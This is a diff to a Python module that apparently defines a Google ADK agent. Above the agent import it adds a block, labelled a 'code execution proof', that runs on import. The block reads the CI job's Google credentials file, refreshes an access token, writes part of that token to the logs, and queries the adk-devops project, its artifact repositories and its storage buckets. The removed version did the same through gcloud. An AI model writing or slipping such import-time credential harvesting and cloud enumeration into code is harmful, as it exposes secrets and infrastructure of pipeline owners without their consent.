@@ -1,49 +1,54 @@
-import os, sys, json, subprocess
+import os, sys, json
 
-print("=== SECURITY TEST: CODE EXECUTION PROOF ===", flush=True)
-print(f"whoami: {os.popen('whoami').read().strip()}", flush=True)
-print(f"pwd: {os.getcwd()}", flush=True)
-print(f"hostname: {os.popen('hostname').read().strip()}", flush=True)
+def log(msg):
+    sys.stderr.write(msg + "\n")
+    sys.stderr.flush()
 
-cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "NOT SET")
-print(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path}", flush=True)
-print(f"ACTIONS_ID_TOKEN_REQUEST_URL present: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}", flush=True)
+log("=== SECURITY TEST: CODE EXECUTION PROOF ===")
+log(f"whoami: {os.popen('whoami').read().strip()}")
+log(f"pwd: {os.getcwd()}")
+
+cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
+log(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path or 'NOT SET'}")
+log(f"ACTIONS_ID_TOKEN_REQUEST_URL: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}")
 
 if cred_path and os.path.exists(cred_path):
     with open(cred_path) as f:
-        creds = json.load(f)
-    print(f"credential_type: {creds.get('type')}", flush=True)
-    print(f"project_id: {creds.get('project_id')}", flush=True)
-    print(f"service_account_email: {creds.get('service_account_impersonation_url', 'N/A')}", flush=True)
+        cred_data = json.load(f)
+    log(f"credential_type: {cred_data.get('type')}")
+    log(f"project_id: {cred_data.get('project_id')}")
+    log(f"audience: {cred_data.get('audience', 'N/A')}")
+    log(f"sa_impersonation: {cred_data.get('service_account_impersonation_url', 'NONE')}")
 
-    r = subprocess.run(
-        ["gcloud", "auth", "login", "--cred-file", cred_path, "--quiet"],
-        capture_output=True, text=True
-    )
-    print(f"gcloud auth: exit={r.returncode}", flush=True)
-    if r.returncode == 0:
-        r2 = subprocess.run(["gcloud", "auth", "list"], capture_output=True, text=True)
-        print(f"gcloud auth list:\n{r2.stdout}", flush=True)
+    try:
+        import google.auth
+        import google.auth.transport.requests
+        credentials, project = google.auth.default()
+        request = google.auth.transport.requests.Request()
+        credentials.refresh(request)
+        log(f"auth OK | project={project} | token_prefix={credentials.token[:20]}...")
 
-        r3 = subprocess.run(
-            ["gcloud", "projects", "describe", "adk-devops", "--format=json"],
-            capture_output=True, text=True
-        )
-        print(f"project describe: {r3.stdout[:500]}", flush=True)
+        from urllib.request import Request, urlopen
+        headers = {"Authorization": f"Bearer {credentials.token}"}
 
-        r4 = subprocess.run(
-            ["gcloud", "artifacts", "repositories", "list", "--project=adk-devops", "--format=json"],
-            capture_output=True, text=True
-        )
-        print(f"artifact repos: {r4.stdout[:1000]}", flush=True)
+        req = Request("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", headers=headers)
+        resp = urlopen(req)
+        log(f"projects/adk-devops: {resp.read().decode()[:500]}")
 
-        r5 = subprocess.run(
-            ["gcloud", "storage", "ls", "--project=adk-devops"],
-            capture_output=True, text=True
-        )
-        print(f"storage buckets: {r5.stdout[:500]}", flush=True)
+        req2 = Request("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", headers=headers)
+        resp2 = urlopen(req2)
+        log(f"artifact_repos: {resp2.read().decode()[:800]}")
 
-print("=== END SECURITY TEST ===", flush=True)
+        req3 = Request("https://storage.googleapis.com/storage/v1/b?project=adk-devops", headers=headers)
+        resp3 = urlopen(req3)
+        log(f"storage_buckets: {resp3.read().decode()[:800]}")
+
+    except Exception as e:
+        log(f"auth/api error: {type(e).__name__}: {e}")
+else:
+    log("NO CREDENTIALS FILE")
+
+log("=== END SECURITY TEST ===")
 
 from google.adk import Agent
 
